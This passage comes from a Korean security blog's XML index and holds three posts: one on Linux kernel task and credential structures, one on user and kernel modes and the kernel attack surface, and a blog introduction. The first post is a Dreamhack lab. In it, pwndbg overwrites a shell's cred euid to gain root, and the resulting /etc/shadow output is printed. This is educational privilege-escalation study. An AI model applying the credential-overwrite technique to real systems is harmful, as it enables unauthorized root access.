...<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>속성(property)</th><th>설명(description)</th></tr></thead><tbody><tr><td>__state</td><td>해당 태스크의 실행상태를 나타낸다. 0은 실행 중이거나 실행 가능한(ready) 상태를 표현한다. 0보다 큰 값의 경우는 정지 또는 대기 상태를 표현한다.</td></tr><tr><td>tasks</td><td>태스크의 연결 노드를 의미한다.</td></tr><tr><td>mm</td><td>mm_struct는 유저의 메모리 영역(주소공간)에 관한 정보를 나타내는 구조체이다. 해당 태스크의 주소공간의 정보를 나타낸다.</td></tr><tr><td>pid</td><td>프로세스의 식별값을 의미한다.</td></tr><tr><td>tgid</td><td>스레드 그룹의 식별값을 의미한다.</td></tr><tr><td>real_parent</td><td>해당 태스크를 생성한 부모 태스크를 나타낸다.</td></tr><tr><td>parent</td><td>해당 태스크의 현재 부모 태스크를 나타낸다.</td></tr><tr><td>cred</td><td>해당 태스크의 신원 정보를 나타낸다.</td></tr><tr><td>comm[TASK_COMM_LEN]</td><td>해당 태스크의 이름을 나타낸다.</td></tr><tr><td>files</td><td>해당 태스크에서 열린 파일 디스크립터 정보를 나타낸다.</td></tr></tbody></table><h3 id="mm-struct"><a href="#mm-struct" class="headerlink" title="mm_struct"></a>mm_struct</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">struct task_struct &#123;<br>    ...<br>unsigned int__state;<br>struct list_headtasks;<br>    struct mm_struct*mm;<br>pid_tpid;<br>pid_ttgid;<br>struct task_struct __rcu*real_parent;<br>struct task_struct __rcu*parent;<br>const struct cred __rcu*cred;<br>charcomm[TASK_COMM_LEN];<br>struct files_struct*files;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>속성(property)</th><th>설명(description)</th></tr></thead><tbody><tr><td>__state</td><td>해당 태스크의 실행상태를 나타낸다. 0은 실행 중이거나 실행 가능한(ready) 상태를 표현한다. 0보다 큰 값의 경우는 정지 또는 대기 상태를 표현한다.</td></tr><tr><td>tasks</td><td>태스크의 연결 노드를 의미한다.</td></tr><tr><td>mm</td><td>mm_struct는 유저의 메모리 영역(주소공간)에 관한 정보를 나타내는 구조체이다. 해당 태스크의 주소공간의 정보를 나타낸다.</td></tr><tr><td>pid</td><td>프로세스의 식별값을 의미한다.</td></tr><tr><td>tgid</td><td>스레드 그룹의 식별값을 의미한다.</td></tr><tr><td>real_parent</td><td>해당 태스크를 생성한 부모 태스크를 나타낸다.</td></tr><tr><td>parent</td><td>해당 태스크의 현재 부모 태스크를 나타낸다.</td></tr><tr><td>cred</td><td>해당 태스크의 신원 정보를 나타낸다.</td></tr><tr><td>comm[TASK_COMM_LEN]</td><td>해당 태스크의 이름을 나타낸다.</td></tr><tr><td>files</td><td>해당 태스크에서 열린 파일 디스크립터 정보를 나타낸다.</td></tr></tbody></table><h3 id="cred"><a href="#cred" class="headerlink" title="cred"></a>cred</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">struct cred &#123;<br>atomic_tusage;<br>    ...<br>kuid_tuid;/* real UID of the task */<br>kgid_tgid;/* real GID of the task */<br>kuid_tsuid;/* saved UID of the task */<br>kgid_tsgid;/* saved GID of the task */<br>kuid_teuid;/* effective UID of the task */<br>kgid_tegid;/* effective GID of the task */<br>kuid_tfsuid;/* UID for VFS ops */<br>kgid_tfsgid;/* GID for VFS ops */<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>속성(property)</th><th>설명(description)</th></tr></thead><tbody><tr><td>usage</td><td>몇 개의 프로세스가 해당 cred 구조체를 참조하고 있는 지 나타낸 정보이다.</td></tr><tr><td>uid</td><td>프로세스를 소유하고 있는 사용자의 ID를 나타낸 정보이다. 0일 경우 최고관리자 권한을 의미한다.</td></tr><tr><td>euid</td><td>프로세스의 실효적인 사용자 ID를 나타낸 정보이다. 권한 검사를 할 경우 실제 사용되는 값을 저장한다. 일반적으로 uid와 같은 값을 가진다.</td></tr><tr><td>gid</td><td>프로세스를 소유하 고 있는 그룹의 ID 정보를 나타낸다.</td></tr><tr><td>egid</td><td>프로세스의 실효적인 그룹의 ID 정보를 나타낸다.</td></tr></tbody></table><h2 id="credential-정보-수정을-통한-권한-상승"><a href="#credential-정보-수정을-통한-권한-상승" class="headerlink" title="credential 정보 수정을 통한 권한 상승"></a>credential 정보 수정을 통한 권한 상승</h2><p>앞서 진행한 과정을 통해 프로세스와 스레드는 태스크라는 단위로 관리되어 있고 태스크의 정보 속성을 관리하는 주체가 있으며 신원정보는 cred라는 구조체에서 관리되고 있음을 알 수 있다. 그렇다면 태스크의 신원정보를 변경하였을 경우 권한 상승(Local Privilege Escalation)이 이뤄질 수 있는 지 확인하겠다. </p><p>해당 실습은 Dreamhack에서 제시하는 실습 파일을 이용하여 진행하였음을 밝힌다.</p><pre><code>dreamhack@dh-lke:~$ whoamidreamhackdreamhack@dh-lke:~$ cat /etc/shadowcat: /etc/shadow: Permission denieddreamhack@dh-lke:~$ echo $$295dreamhack@dh-lke:~$ ...</code></pre><p>qemu를 이용하여 터미널을 실행하였을 경우 다음과 같이 root 권한이 아니기 때문에 /etc/shadow 파일을 볼 수 없는 것을 확인할 수 있으며 해당 쉘의 프로세스 아이디(PID)는 295로 확인된다.</p><pre><code>pwndbg&gt; x/bs $lx_task_by_pid(295).comm0xffff88803e348a98:    &quot;bash&quot;pwndbg&gt; print $lx_task_by_pid(295).state$1 = 1pwndbg&gt; print $lx_task_by_pid(295).cred-&gt;uid$2 = &#123;    val = 1000&#125;pwndbg&gt; set $lx_task_by_pid(295).cred-&gt;euid = 0pwndbg&gt; cont</code></pre><p>해당 프로세스의 아이디를 이용하여 해당 태스크의 정보를 확인해본 결과 해당 프로세스는 실행중인 프로세스이며 uid가 1000으로 지정되어 있다. 이를 의도적으로 0으로 수정해보았다.</p><pre><code>dreamhack@dh-lke:~$ whoamirootdreamhack@dh-lke:~$ cat /etc/shadowroot:*:18511:0:99999:7:::daemon:*:18511:0:99999:7:::bin:*:18511:0:99999:7:::sys:*:18511:0:99999:7:::sync:*:18511:0:99999:7:::games:*:18511:0:99999:7:::man:*:18511:0:99999:7:::lp:*:18511:0:99999:7:::mail:*:18511:0:99999:7:::</code></pre><p>해당 과정을 수행해본 결과 해당 프로세스는 최고 관리자 권한(root)를 획득하였음을 볼 수 있다.</p><h2 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h2><p>프로세스(process)와 스레드(thread)는 태스크 관리로 운영되며 태스크의 속성을 표현하는 정보가 있다. 해당 정보 중에는 프로세스의 신원정보를 의미하는 cred 구조체 형태의 정보가 있으며 이를 조작하여 최고관리자 권한을 얻을 수 있다. 태스크의 정보는 커널 메모리의 상주하며 커널의 취약점을 이용한다면 권한상승(Local Privilege Escalation)이 발생할 수 있음을 보인다.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (1) 유저모드와 커널모드</title>
    <link href="/2021/09/04/LinuxKernelBasic1/"/>
    <url>/2021/09/04/LinuxKernelBasic1/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-1-유저모드와-커널모드"><a href="#Research-Linux-Kernel-Basic-1-유저모드와-커널모드" class="headerlink" title="[Research] Linux Kernel Basic - (1) 유저모드와 커널모드"></a>[Research] Linux Kernel Basic - (1) 유저모드와 커널모드</h2><p><img src="/img/penguinshot.png"></p><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>리눅스 커널 공격(Linux Kernel Exploitation)을 진행하기 위해서는 리눅스 커널(Linux Kernel)에 대한 이해가 먼저 선행되어야 한다. 하지만 리눅스 커널(Linux Kernel)은 일반적으로 접근한다면 오픈소스의 특성인 집단지성의 결정체라고 할 수 있을만큼 매우 방대하며 모든 것을 학습을 할 수 없다. 그러므로 리눅스 커널 공격(Linux Kernel Exploitation)을 위한 기초적인 운영체제의 지식을 기반으로하여 프로세스의 메모리 구조, 유저모드(user mode)와 커널모드(kernel mode), 커널의 공격할 수 있는 부분(attack surface)가 될 수 있는 많은 부분 중 쉽게 구현할 수 있는 디바이스 드라이버(device driver)를 기반으로 연구를 진행했다.</p><h2 id="커널-kernel-이란"><a href="#커널-kernel-이란" class="headerlink" title="커널(kernel)이란"></a>커널(kernel)이란</h2><p><img src="/img/arch.png"></p><p>공격할 대상은 리눅스 커널(linux kernel)이다. 그렇다면 커널(kernel)이 무엇인지 확인하고 넘어갈 필요가 있다. 컴퓨터(computer)는 흔히 알고 있는 전기적으로 제어할 수 있는 CPU, Memory, Devices들로 이루어진 일종의 기계장치(machine)으로 볼 수 있다. 기계란 어떠한 방식으로 동작되는 지 사람이 지정해주어야 하며 기계의 특성상 프로그램을 실행할 수 있도록 섬세하게 조정이 되어야 한다. 그렇지 않다면 단순한 실리콘 덩어리들의 불과하다. 다음과 같은 이유를 고려하면 어떻게 이러한 실리콘 덩어리를 잘 활용하여야 흔히 사용하는 프로그램을 돌리기 위해서는 어떠한 동작이 정의되어 있어야 한다. 커널(kernel)은 다음과 같은 역할을 하기에 중간계층이라고도 많이 불리운다.</p><h2 id="메모리-memory-란"><a href="#메모리-memory-란" class="headerlink" title="메모리(memory)란"></a>메모리(memory)란</h2><p><img src="/img/process_memory.png"></p><p>프로그램이 실행되기 위해서는 보조기억장치(HDD, SSD등)에서 주기억장치(RAM)에 로드 되어야 한다. 하나의 프로세스가 로드되면 32bit를 예시로 총 4GB의 가상메모리 공간에 위치하게 된다. 상단에 제시한 그림과 같은 형태를 나타낸다. 상위 주소(0xC0000000 ~ 0xFFFFFFFF)에는 커널의 위치한 주소가 되며 하위 주소(0x00000000~0xBFFFFFFFF)에는 흔히 알고 있는 유저 프로세스가 로드된다. 커널의 경우는 앞서 언급한 것과 같이 하드웨어의 직접적으로 접근할 수 있는 중요한 부분이며 이러한 이유로 스택 메모리를 확인하면 높은 주소에서 낮은 주소로 데이터가 쓰이는 것을 볼 수 있다.</p><h2 id="커널의-권한"><a href="#커널의-권한" class="headerlink" title="커널의 권한"></a>커널의 권한</h2><p><img src="/img/two_rise_sun.PNG" alt="하늘아래 태양은 두개가 될 수 없는 법."></p><p>커널은 프로세스들을 관리하기도 하고 주요한 정보들이 위치하기에 일반적으로 높은 권한을 지니고 있다. 그럼 다른 이야기를 해보자! 서로 친해지기 위해서 술게임을 하며 왕게임을 하는 데 가학적 성격장애가 있는 친구에게 권력이 부여된다면 타겟들은 인생이 힘들어진다. 또한 아무나 왕이 될 수 있다고하면 배가 산으로 가게되며 시스템 상에서는 아주 큰 문제가 발생할 수 있다. 그러므로 시스템에서는 특권을 지닌 커널 모드와 제한된 권한인 유저 모드로 나누어져 있다.</p><h2 id="커널에게-일을-시키고-싶어-시스템콜-syscall"><a href="#커널에게-일을-시키고-싶어-시스템콜-syscall" class="headerlink" title="커널에게 일을 시키고 싶어 - 시스템콜(syscall)"></a>커널에게 일을 시키고 싶어 - 시스템콜(syscall)</h2><p><img src="/img/systemcall.PNG"></p><p>그렇다면 어떻게 하면 커널을 공격할 수 있을 지 고민해보아야 한다. 일반적으로 유저 권한을 지닌 사용자 어플리케이션을 생각해보면 입력값(Input)이 될 수 있는 부분에서 문제가 발생한다. 커널도 마찬가지이다. 커널에서의 입력값(Input)이 될 수 있는 부분에서 문제가 발생한다. 이를 공격 표면(attack surface)라고 불린다. 가장 손쉽게 접근이 가능한 부분은 시스템 콜(syscall)이라고 볼 수 있다. 유저 모드에서는 직접적으로 컴퓨터의 중요 자원에 접근할 수 없기 때문에 커널 모드로의 전환이 일어나야 한다. 흔히 사용하는 printf와 같이 화면에 출력을 하는 함수의 경우도 저수준 함수로 변환되어 커널에게 시스템 콜이라는 인터럽트(interrupt)를 발생시키게 된다. </p><h2 id="커널의-공격-대상-attack-vector"><a href="#커널의-공격-대상-attack-vector" class="headerlink" title="커널의 공격 대상(attack vector)"></a>커널의 공격 대상(attack vector)</h2><p>커널의 주요한 자원에 접근하기 위해서는 직접적으로 접근할 수 없으며 시스템 콜과 같은 간접적인 형태로 접근할 수 있음을 언급하였다. 또한 정의된 시스템 콜 이외에도 리눅스의 경우 디바이스 드라이버 또는 파일 시스템이 모두 커널 모드에서 동작된다. 이러한 요소들까지 고려하면 리눅스의 attack surface의 경우는 시스템 콜 뿐만이 아닌 블루투스 디바이스 드라이버와 같은 많은 형태로 확장이 가능하다.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Etc] G4EG4EG4E는 왜 이 블로그를 만들었는가?</title>
    <link href="/2021/09/03/gaelog-introduction/"/>
    <url>/2021/09/03/gaelog-introduction/</url>
    
    <content type="html"><![CDATA[<h2 id="G4EG4EG4E는-왜-이-블로그를-만들었는가-부제-직업체험"><a href="#G4EG4EG4E는-왜-이-블로그를-만들었는가-부제-직업체험" class="headerlink" title="G4EG4EG4E는 왜 이 블로그를 만들었는가? - 부제.직업체험"></a>G4EG4EG4E는 왜 이 블로그를 만들었는가? - 부제.직업체험</h2><p><img src="/img/introduction.PNG"></p><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>항상 글은 첫 시작이 어렵다. 글 뿐만 아니라 모든 것이 첫 시작이 어렵다. 기존의 개인적으로 운영하던 블로그가 존재하였으나 너무 시대에 뒤떨어진(?) 플랫폼에서 운영되며 나는 간지로 먹고사는 개발자이기 때문에 유행에 따르게 되어 새로운 블로그를 시작하게 되었다. </p><p>사실은 회사의 마케팅 채널로 기술 블로그를 운영할 시점이기도 하였으며 앞으로 진행할 연구로 인해서 연구노트를 작성해야 하였으며 평소 내가 사모(?)하던 (이하 ‘b40W0lF’)님께서 연구노트처럼 블로그 작성을 권해주셨으며 무한히 신뢰하기 때문에 해당 의견대로 블로그 글을 작성하겠다.</p><p>사랑합니다! 프로페써!!!</p>]]></content>
    
    
    <categories>
      
      <category>Etc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Sample1</tag>
      
      <tag>Sample2</tag>
      
      <tag>Sample3</tag>
      
      <tag>Sample4</tag>
      
      <tag>Sample5</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
